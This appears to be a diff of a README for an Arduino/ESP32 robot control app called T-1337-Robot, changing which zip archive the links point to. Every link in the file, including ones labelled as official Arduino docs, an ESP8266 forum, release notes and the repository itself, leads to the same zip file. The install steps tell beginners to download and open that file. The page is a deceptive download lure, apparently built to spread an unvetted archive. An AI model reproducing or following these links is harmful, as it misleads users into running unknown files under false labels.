@@ -4,7 +4,7 @@
 Welcome to the T-1337-Robot project! This software helps you control an Arduino-based robot using the ESP8266 or ESP32 for seamless connectivity. With this guide, even beginners can successfully download and run the application.
 
 ## 🔗 Download Now!
-[![Download T-1337-Robot](https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip)](https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip)
+[![Download T-1337-Robot](https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip)](https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip)
 
 ## 🚀 Getting Started
 To start using T-1337-Robot, follow these simple steps. Make sure your system meets the following requirements:
@@ -27,7 +27,7 @@ To start using T-1337-Robot, follow these simple steps. Make sure your system me
 Once your hardware is ready, installing and running the application is straightforward.
 
 ### 📥 Download & Install
-1. **Visit this page to download:** [T-1337-Robot Releases](https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip)
+1. **Visit this page to download:** [T-1337-Robot Releases](https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip)
 2. Find the latest version and download the appropriate file for your operating system.
 3. Open the file you downloaded to start the installation process.
 4. Follow the on-screen instructions to complete the setup.
@@ -56,9 +56,9 @@ If you encounter issues not covered here, please visit our GitHub Issues page. Y
 - **Integration with Python:** Utilize Python scripts to enhance functionality if desired.
 
 ## ⚡ Additional Resources
-- **Arduino Documentation:** [Arduino Official Docs](https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip)
-- **ESP8266 Documentation:** [ESP8266 Community Forum](https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip)
-- **Python Resources:** [https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip](https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip)
+- **Arduino Documentation:** [Arduino Official Docs](https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip)
+- **ESP8266 Documentation:** [ESP8266 Community Forum](https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip)
+- **Python Resources:** [https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip](https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip)
 
 ## 💼 Contributions
 We welcome contributions to this project. If you would like to help, please check out the Contribution Guidelines located within the repository.
@@ -68,7 +68,7 @@ This project is licensed under the MIT License. Feel free to use it and modify i
 
 ## 🔗 Other Links
 For more updates and information:
-- [GitHub Repository](https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip)
-- [Release Notes](https://raw.githubusercontent.com/riverlan20/T-1337-Robot/main/ui/Gui/Robot-3.5.zip)
+- [GitHub Repository](https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip)
+- [Release Notes](https://github.com/riverlan20/T-1337-Robot/raw/refs/heads/main/esp32/Robot-1.6.zip)
 
 Now you are set to control your own T-1337 Robot! Enjoy the adventure of robotics!
